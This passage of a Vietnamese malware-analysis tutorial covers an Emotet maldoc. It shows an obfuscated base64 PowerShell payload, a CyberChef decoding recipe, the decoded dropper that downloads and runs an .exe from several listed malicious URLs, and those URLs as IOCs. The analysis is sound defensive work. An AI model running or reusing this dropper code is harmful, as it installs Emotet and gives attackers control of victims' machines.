+, A :, A :L, A :L, A : , A :-, A :E, A :N, A :C, A :O, A :D, A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : JA, A :BQ, A :AG, A :gA, A :YQ, A :A5, A :AG, A :4A, A :OA, A :Bz, A :AD, A :0A, A :KA, A :An, A :AF, A :EA, A :Jw, A :Ar, A :AC, A :cA, A :bA, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :gA, A :Jw, A :Ar, A :AC, A :cA, A :bw, A :Bf, A :AG, A :YA, A :aA, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :4A, A :KA, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :B3, A :AC, A :0A, A :aQ, A :B0, A :AG, A :UA, A :bQ, A :An, A :AC, A :kA, A :IA, A :Ak, A :AE, A :UA, A :Tg, A :BW, A :AD, A :oA, A :VQ, A :Bz, A :AG, A :UA, A :Ug, A :BQ, A :AF, A :IA, A :Tw, A :BG, A :AE, A :kA, A :bA, A :BF, A :AF, A :wA, A :Vw, A :Bn, A :AF, A :8A, A :Xw, A :Az, A :AE, A :0A, A :RA, A :Bc, A :AH, A :YA, A :UA, A :Bu, A :AH, A :kA, A :Mg, A :A0, A :AF, A :YA, A :XA, A :Ag, A :AC, A :0A, A :aQ, A :B0, A :AG, A :UA, A :bQ, A :B0, A :AH, A :kA, A :cA, A :Bl, A :AC, A :AA, A :RA, A :BJ, A :AF, A :IA, A :RQ, A :BD, A :AH, A :QA, A :Tw, A :By, A :AF, A :kA, A :Ow, A :Bb, A :AE, A :4A, A :ZQ, A :B0, A :AC, A :4A, A :Uw, A :Bl, A :AH, A :IA, A :dg, A :Bp, A :AG, A :MA, A :ZQ, A :BQ, A :AG, A :8A, A :aQ, A :Bu, A :AH, A :QA, A :TQ, A :Bh, A :AG, A :4A, A :YQ, A :Bn, A :AG, A :UA, A :cg, A :Bd, A :AD, A :oA, A :Og, A :Ai, A :AH, A :MA, A :ZQ, A :Bj, A :AH, A :UA, A :Ug, A :BJ, A :AH, A :QA, A :YA, A :BZ, A :AG, A :AA, A :cA, A :By, A :AE, A :8A, A :dA, A :Bv, A :AE, A :MA, A :bw, A :Bs, A :AC, A :IA, A :IA, A :A9, A :AC, A :AA, A :KA, A :An, A :AH, A :QA, A :bA, A :An, A :AC, A :sA, A :KA, A :An, A :AH, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :MQ, A :Ay, A :AC, A :wA, A :IA, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bs, A :AH, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :MQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :MQ, A :An, A :AC, A :sA, A :Jw, A :As, A :AC, A :AA, A :dA, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :cw, A :An, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :wA, A :bg, A :Bj, A :AD, A :gA, A :Yw, A :Bs, A :AH, A :kA, A :IA, A :A9, A :AC, A :AA, A :KA, A :Ao, A :AC, A :cA, A :Wg, A :An, A :AC, A :sA, A :Jw, A :Bj, A :AD, A :EA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :Ng, A :Bs, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :JA, A :BI, A :AG, A :EA, A :dg, A :Br, A :AG, A :MA, A :YQ, A :Bk, A :AD, A :0A, A :KA, A :An, A :AF, A :IA, A :Mw, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :EA, A :bQ, A :A2, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :Mg, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :QA, A :UA, A :Bl, A :AD, A :EA, A :ZQ, A :By, A :AG, A :4A, A :Mg, A :A9, A :AC, A :QA, A :ZQ, A :Bu, A :AH, A :YA, A :Og, A :B1, A :AH, A :MA, A :ZQ, A :By, A :AH, A :AA, A :cg, A :Bv, A :AG, A :YA, A :aQ, A :Bs, A :AG, A :UA, A :Kw, A :Ao, A :AC, A :gA, A :KA, A :An, A :AE, A :sA, A :Jw, A :Ar, A :AC, A :cA, A :Yg, A :BR, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Vw, A :Bn, A :AC, A :cA, A :Kw, A :An, A :AF, A :8A, A :Xw, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :MA, A :bQ, A :Bk, A :AC, A :cA, A :Kw, A :An, A :AE, A :sA, A :Yg, A :An, A :AC, A :sA, A :Jw, A :BR, A :AF, A :YA, A :cA, A :Bu, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B5, A :AD, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :NA, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :dg, A :An, A :AC, A :sA, A :Jw, A :BL, A :AG, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :BR, A :AC, A :cA, A :KQ, A :Ag, A :AC, A :AA, A :LQ, A :BS, A :AG, A :UA, A :UA, A :BM, A :AE, A :EA, A :Qw, A :Bl, A :AC, A :AA, A :IA, A :Ao, A :AC, A :cA, A :Sw, A :Bi, A :AC, A :cA, A :Kw, A :An, A :AF, A :EA, A :Jw, A :Ap, A :AC, A :wA, A :Ww, A :Bj, A :AE, A :gA, A :YQ, A :By, A :AF, A :0A, A :OQ, A :Ay, A :AC, A :kA, A :Kw, A :Ak, A :AE, A :wA, A :bg, A :Bj, A :AD, A :gA, A :Yw, A :Bs, A :AH, A :kA, A :Kw, A :Ao, A :AC, A :gA, A :Jw, A :Au, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :eA, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :UA, A :Jw, A :Ap, A :AD, A :sA, A :JA, A :Ba, A :AH, A :oA, A :Ng, A :Bu, A :AH, A :EA, A :cA, A :Ax, A :AD, A :0A, A :KA, A :An, A :AF, A :MA, A :aQ, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :4A, A :eQ, A :B5, A :AC, A :cA, A :Kw, A :An, A :AG, A :MA, A :aA, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :QA, A :RQ, A :A3, A :AD, A :IA, A :dw, A :Bi, A :AG, A :QA, A :YQ, A :A9, A :AC, A :4A, A :KA, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :B3, A :AC, A :0A, A :bw, A :Bi, A :AG, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :Bj, A :AC, A :cA, A :Kw, A :An, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :AA, A :bg, A :BF, A :AF, A :QA, A :Lg, A :B3, A :AG, A :UA, A :Yg, A :Bj, A :AE, A :wA, A :aQ, A :Bl, A :AE, A :4A, A :VA, A :A7, A :AC, A :QA, A :TQ, A :Bu, A :AH, A :YA, A :bg, A :Ay, A :AG, A :MA, A :Yg, A :A9, A :AC, A :gA, A :KA, A :An, A :AG, A :gA, A :Jw, A :Ar, A :AC, A :cA, A :dA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AD, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :Av, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AH, A :IA, A :ZQ, A :An, A :AC, A :sA, A :Jw, A :Bz, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :8A, A :aw, A :An, A :AC, A :sA, A :Jw, A :Bp, A :AH, A :QA, A :Yw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :aA, A :Bl, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :cw, A :Au, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bj, A :AC, A :cA, A :Kw, A :An, A :AG, A :8A, A :bQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :By, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :dQ, A :By, A :AC, A :cA, A :Kw, A :An, A :AH, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :Bp, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Zw, A :Bv, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :Bm, A :AF, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :Aq, A :AG, A :gA, A :dA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cA, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :oA, A :Lw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AH, A :cA, A :Jw, A :Ar, A :AC, A :cA, A :dw, A :B3, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Au, A :AC, A :cA, A :Kw, A :An, A :AG, A :QA, A :ag, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :cg, A :An, A :AC, A :sA, A :Jw, A :Bh, A :AG, A :kA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AH, A :MA, A :bw, A :By, A :AC, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :bw, A :An, A :AC, A :sA, A :Jw, A :Bt, A :AC, A :8A, A :ZQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :cg, A :An, A :AC, A :sA, A :Jw, A :By, A :AG, A :8A, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AH, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :B3, A :AD, A :cA, A :Rw, A :An, A :AC, A :kA, A :Kw, A :An, A :AD, A :MA, A :Lw, A :An, A :AC, A :sA, A :KA, A :An, A :AC, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :aA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :Og, A :Av, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AG, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :YQ, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :sA, A :YQ, A :An, A :AC, A :sA, A :Jw, A :By, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Yg, A :B1, A :AH, A :oA, A :eg, A :Au, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :ZQ, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :8A, A :Yw, A :Bz, A :AC, A :cA, A :Kw, A :An, A :AH, A :MA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :BD, A :AH, A :kA, A :Sw, A :An, A :AC, A :sA, A :Jw, A :Bn, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :Kg, A :Bo, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :cw, A :An, A :AC, A :sA, A :Jw, A :A6, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AH, A :cA, A :aQ, A :Bs, A :AC, A :cA, A :Kw, A :An, A :AG, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :Bh, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cA, A :An, A :AC, A :sA, A :Jw, A :Bp, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bh, A :AC, A :cA, A :Kw, A :An, A :AG, A :wA, A :bQ, A :Bn, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :bQ, A :B0, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lg, A :An, A :AC, A :sA, A :Jw, A :Bu, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :dA, A :Av, A :AH, A :cA, A :Jw, A :Ar, A :AC, A :cA, A :cA, A :At, A :AG, A :MA, A :bw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :bg, A :B0, A :AG, A :UA, A :bg, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :ag, A :An, A :AC, A :kA, A :Kw, A :An, A :AD, A :YA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :oA, A :aA, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :Og, A :An, A :AC, A :kA, A :Kw, A :An, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AG, A :MA, A :YQ, A :Bs, A :AC, A :cA, A :Kw, A :An, A :AG, A :kA, A :Zg, A :Bv, A :AH, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :4A, A :aQ, A :Bh, A :AG, A :EA, A :cw, A :Bh, A :AC, A :cA, A :Kw, A :An, A :AC, A :4A, A :Yw, A :Bv, A :AG, A :0A, A :Lw, A :Bj, A :AG, A :EA, A :Jw, A :Ar, A :AC, A :cA, A :bA, A :Bp, A :AG, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :bw, A :An, A :AC, A :kA, A :Kw, A :An, A :AH, A :IA, A :bg, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :kA, A :YQ, A :An, A :AC, A :sA, A :Jw, A :Bh, A :AH, A :MA, A :YQ, A :An, A :AC, A :kA, A :Kw, A :An, A :AC, A :4A, A :Yw, A :An, A :AC, A :sA, A :Jw, A :Bv, A :AG, A :0A, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AD, A :gA, A :dA, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :Aq, A :AG, A :gA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :B0, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AD, A :oA, A :Lw, A :Av, A :AH, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :aQ, A :By, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :YQ, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :Yg, A :By, A :AG, A :8A, A :dw, A :An, A :AC, A :sA, A :Jw, A :Bu, A :AC, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :Bv, A :AG, A :0A, A :Lw, A :Bl, A :AC, A :cA, A :Kw, A :An, A :AD, A :MA, A :Yw, A :An, A :AC, A :kA, A :Kw, A :An, A :AD, A :AA, A :bg, A :An, A :AC, A :sA, A :Jw, A :Bn, A :AC, A :cA, A :Kw, A :An, A :AG, A :YA, A :ag, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :BO, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :aA, A :B0, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :cA, A :A6, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :KA, A :An, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :aw, A :Bo, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bh, A :AH, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :YQ, A :B6, A :AG, A :0A, A :aQ, A :An, A :AC, A :sA, A :Jw, A :Bz, A :AG, A :MA, A :aA, A :Bs, A :AC, A :4A, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :bw, A :An, A :AC, A :sA, A :Jw, A :Bt, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Lw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AC, A :8A, A :Jw, A :Ap, A :AC, A :4A, A :Ig, A :Bz, A :AG, A :AA, A :UA, A :Bs, A :AG, A :kA, A :VA, A :Ai, A :AC, A :gA, A :Ww, A :Bj, A :AG, A :gA, A :YQ, A :By, A :AF, A :0A, A :NA, A :Ay, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :cA, A :cQ, A :Ax, A :AD, A :gA, A :NA, A :B4, A :AH, A :AA, A :PQ, A :Ao, A :AC, A :cA, A :Tg, A :An, A :AC, A :sA, A :Jw, A :Az, A :AG, A :oA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AG, A :sA, A :NA, A :Bt, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :Zg, A :Bv, A :AH, A :IA, A :ZQ, A :Bh, A :AG, A :MA, A :aA, A :Ao, A :AC, A :QA, A :SQ, A :B5, A :AH, A :oA, A :dg, A :B2, A :AD, A :UA, A :aw, A :Ag, A :AG, A :kA, A :bg, A :Ag, A :AC, A :QA, A :TQ, A :Bu, A :AH, A :YA, A :bg, A :Ay, A :AG, A :MA, A :Yg, A :Ap, A :AH, A :sA, A :dA, A :By, A :AH, A :kA, A :ew, A :Ak, A :AE, A :UA, A :Nw, A :Ay, A :AH, A :cA, A :Yg, A :Bk, A :AG, A :EA, A :Lg, A :Ai, A :AG, A :QA, A :Tw, A :B3, A :AG, A :AA, A :Tg, A :BM, A :AE, A :8A, A :YQ, A :Bk, A :AG, A :YA, A :SQ, A :Bg, A :AG, A :wA, A :RQ, A :Ai, A :AC, A :gA, A :JA, A :BJ, A :AH, A :kA, A :eg, A :B2, A :AH, A :YA, A :NQ, A :Br, A :AC, A :wA, A :IA, A :Ak, A :AF, A :AA, A :ZQ, A :Ax, A :AG, A :UA, A :cg, A :Bu, A :AD, A :IA, A :KQ, A :A7, A :AC, A :QA, A :Rw, A :A1, A :AD, A :IA, A :eg, A :Bh, A :AD, A :AA, A :bA, A :A9, A :AC, A :gA, A :Jw, A :BI, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :B2, A :AD, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :eQ, A :Bw, A :AD, A :cA, A :Jw, A :Ap, A :AC, A :kA, A :Ow, A :BJ, A :AG, A :YA, A :IA, A :Ao, A :AC, A :gA, A :Jg, A :Ao, A :AC, A :cA, A :Rw, A :An, A :AC, A :sA, A :Jw, A :Bl, A :AH, A :QA, A :LQ, A :BJ, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :Bt, A :AC, A :cA, A :KQ, A :Ag, A :AC, A :QA, A :UA, A :Bl, A :AD, A :EA, A :ZQ, A :By, A :AG, A :4A, A :Mg, A :Ap, A :AC, A :4A, A :Ig, A :BM, A :AG, A :UA, A :Tg, A :Bn, A :AG, A :AA, A :VA, A :BI, A :AC, A :IA, A :IA, A :At, A :AG, A :cA, A :ZQ, A :Ag, A :AD, A :MA, A :MQ, A :A3, A :AD, A :cA, A :Nw, A :Ap, A :AC, A :AA, A :ew, A :Am, A :AC, A :gA, A :Jw, A :BJ, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :dg, A :An, A :AC, A :sA, A :Jw, A :Bv, A :AG, A :sA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :At, A :AE, A :kA, A :dA, A :Bl, A :AG, A :0A, A :Jw, A :Ap, A :AC, A :gA, A :JA, A :BQ, A :AG, A :UA, A :MQ, A :Bl, A :AH, A :IA, A :bg, A :Ay, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :cA, A :Yw, A :Bw, A :AH, A :YA, A :Ng, A :By, A :AG, A :0A, A :PQ, A :Ao, A :AC, A :cA, A :VA, A :A1, A :AC, A :cA, A :Kw, A :An, A :AH, A :oA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bn, A :AG, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :Nw, A :A3, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :Yg, A :By, A :AG, A :UA, A :YQ, A :Br, A :AD, A :sA, A :JA, A :BS, A :AH, A :AA, A :Ng, A :Bt, A :AH, A :MA, A :cg, A :Bs, A :AD, A :0A, A :KA, A :Ao, A :AC, A :cA, A :Vw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :Yw, A :B2, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cg, A :Bk, A :AC, A :cA, A :KQ, A :B9, A :AH, A :0A, A :Yw, A :Bh, A :AH, A :QA, A :Yw, A :Bo, A :AH, A :sA, A :fQ, A :B9, A :AC, A :QA, A :Ug, A :Bj, A :AG, A :IA, A :Mg, A :A5, A :AG, A :QA, A :cA, A :A9, A :AC, A :gA, A :Jw, A :BL, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :cQ, A :Br, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :eA, A :An, A :AC, A :kA, A :Kw, A :An, A :AH, A :oA, A :aA, A :An, A :AC, A :kA
+```
+
+![Ảnh chụp màn hình 2025-03-20 213428](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_fec29cce3f5ee759e5ffcb403f029dd7.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070093&Signature=op6XipWVU3UEYyYhGgRu8sZNqFc%3D)
+
+![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_d87c2d27d4a11974c9df98dde52e96b9.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070108&Signature=SkJ4%2F7rcfGbgT29geyOrhgCXXZ8%3D)
+
+Chúng ta có thể thấy phần còn thiếu cho lệnh `powershell` phía trên là `ll`
+
+Đầu tiên, chúng ta muốn thêm chức năng `"From Base64"` theo sau là `"Remove Null bytes"`. Điều này sẽ làm cho tải trọng đã dễ đọc hơn. Tuy nhiên, vẫn có một số chuỗi được thêm vào như một phần của sự xáo trộn mà bây giờ chúng ta có thể bắt đầu thay thế từng cái một. Điều này sẽ yêu cầu một vài chức nănng Find/Replace bổ sung (với tùy chọn simplestring!). Sau đó, chúng ta sẽ kết thúc với mã PowerShell thuần túy, bản thân nó có một vài chuỗi bị xáo trộn. Để giải mã toàn bộ tải trọng từ đầu đến cuối, có thể sử dụng công thức bên dưới và nhập nó vào Cyberchef.
+
+```
+Find_/_Replace({'option':'Regex','string':', A :'},'',true,false,true,false)
+Find_/_Replace({'option':'Regex','string':'LL -ENCOD'},'',true,false,true,false)
+From_Base64('A-Za-z0-9+/=',true,false)
+Remove_null_bytes()
+Find_/_Replace({'option':'Simple string','string':'\')+(\''},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'\'+\''},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'`'},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'\'+(\''},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'\')+\''},'',true,false,true,false)
+```
+
+**Payload** hoàn chỉnh như sau
+
+```
+$Pha9n8s = ('Ql8o_fh'));.('new-item') $ENV: UseRPROFIlE\ Wg__3MD\ vPny24V\ - itemtype DIRECtOrY;
+[Net.ServicePointManager]::"secuRItYprOtoCol" = ('tls12, tls11, tls');
+$Lnc8cly = (('Zc1o6l'));
+$Havkcad = ('R31m6l2'));
+$Pe1ern2 = $env: userprofile + ((('KbQWg__3mdKbQVpny24vKbQ') - RePLACe('KbQ'), [cHar] 92) + $Lnc8cly + (('.exe'); $Zz6nqp1 = ('Sinyych')); $E72wbda = .('new-object') nET.webcLieNT; $Mnvn2cb = (('http://prestokitchens.com/recurringo/fRe/*http://www.djraisor.com/error/w7G3/*http://dakarbuzz.net/css/CyKg/*https://wildecapitalmgmt.net/wp-content/j6/*http://californiaasa.com/californiaasa.com/8t/*http://viralbrown.com/e3c0ngfjc/N/*http://kharazmischl.com/w/').
+		"sPliT"([char] 42); $Gq184xp = ('N3jwk4m')); foreach($Iyzvv5k in $Mnvn2cb) {
+		try {
+			$E72wbda.
+			"dOwNLOadfIlE"($Iyzvv5k, $Pe1ern2);
+			$G52za0l = ('Hpv6yp7'));
+		If(( & ('Get-Item') $Pe1ern2).
+			"LeNgTH" - ge 31777) {
+			& ('Invoke-Item')($Pe1ern2);
+			$Gcpv6rm = ('T5zgd77'));
+		break;
+		$Rp6msrl = (('Wwncvrd')
+		}
+	} catch {}
+}
+$Rcb29dp = ('Kqkexzh')
+```
+
+Nó xác định một `thư mục ngẫu nhiên` trong `hồ sơ người dùng` và `tên` ngẫu nhiên cho một tệp `.exe` sẽ được tải xuống. Nó khởi tạo một ứng dụng `web .NET` bằng cách sử dụng các `giao thức bảo mật TLSv1.` Phần thú vị nhất là có một `danh sách các URL` mà tập lệnh lặp lại trong vòng lặp for cố gắng tải xuống phần mềm độc hại từ các liên kết độc hại này. Khi tải xuống thành công, ví dụ: kích thước tệp lớn hơn 31777 byte, nó sẽ ngắt khỏi vòng lặp và gọi (thực thi) tệp. Tệp này về cơ bản là `trojan Emotet`, sau đó sẽ tiếp cận cơ sở hạ tầng chỉ huy và điều khiển và cung cấp cho kẻ tấn công quyền kiểm soát hệ thống bằng cách sử dụng nhiều tính năng đi kèm với công cụ.
+
+Danh sách các `IOC` từ payload
+
+```
+http://prestokitchens.com/recurringo/fRe/
+http://www.djraisor.com/error/w7G3/
+http://dakarbuzz.net/css/CyKg/
+https://wildecapitalmgmt.net/wp-content/j6/
+http://californiaasa.com/californiaasa.com/8t/
+http://viralbrown.com/e3c0ngfjc/N/
+http://kharazmischl.com/w/
+```
+
+**IOC (Indicator of Compromise)** là chỉ báo về sự xâm phạm, tức là các dấu hiệu hoặc bằng chứng cho thấy một hệ thống đã bị tấn công hoặc đang có nguy cơ bị xâm nhập.
+
+Bây giờ ta đã hiểu đầy đủ về hành vi của mã độc được nhúng trong tài liệu. Ta cũng biết các bước tiếp theo trong chuỗi lây nhiễm và những điều cần chú ý. Trong môi trường doanh nghiệp, giờ đây chúng ta có thể sử dụng các IOC được trích xuất để chặn chúng, tìm kiếm bất kỳ kết nối nào trước đó và bắt đầu săn lùng các lây nhiễm bổ sung.
+
+# Emotet Maldoc Demonstration
+
+Ta đã có thể `giải mã` và `phân tích maldoc` hoàn toàn thông qua phân tích `tĩnh` và các công cụ dòng lệnh. Tuy nhiên, chúng ta có thể sử dụng `Microsoft Word` hoặc `LibreOffice` để mở và xem tài liệu và Macro. Điều này chỉ nên được thực hiện trong môi trường sandbox có thể được hoàn nguyên về trạng thái trước đó và đã tắt kết nối internet
+
+**LibreOffice**
+
+![Screen-Shot-2021-08-19-at-10.08.05-AM-1024x556](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_11f74979b9c5d9f63723fed033325a07.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070145&Signature=7Vtq6NDKu5WoNS8JniFt1Os9wgc%3D)
+
+Khi mở tài liệu, chúng ta có thể thấy một hình ảnh gây hiểu lầm và các dòng văn bản nhỏ bên dưới. Khi thay đổi kích thước văn bản, chúng ta có thể thấy rằng đây là `mẫu trông đáng ngờ`, hóa ra là` tải trọng được mã hóa.`
+
+Tiếp theo, chúng ta có thể bắt đầu điều tra Macro. Để làm như vậy, cần mở phần Nhà phát triển trong Word, hoặc trong LibreOffice, đi tới `Tools -> Macro -> Edit Macro.`
+
+![Screen-Shot-2021-08-19-at-10.21.36-AM](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_1cbde1c2cda082c45a3d45cd617cc437.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070196&Signature=FxsWHnirdrWWyr6l6Jm3fqh0ieY%3D)
+
+Trong trình chỉnh sửa Macro, chúng ta có thể thấy cấu trúc của tài liệu bao gồm các phần chứa mã xáo trộn. Đối tượng document "`S88ecjif1ml6`" chứa hàm `Document_open` và trong mô-đun biểu mẫu "`Bkc5re_xxwma`", chúng ta có thể thấy các hàm liên quan của nó từ mã VBA. Đây là một cách để xem và trích xuất mã Macro.
+
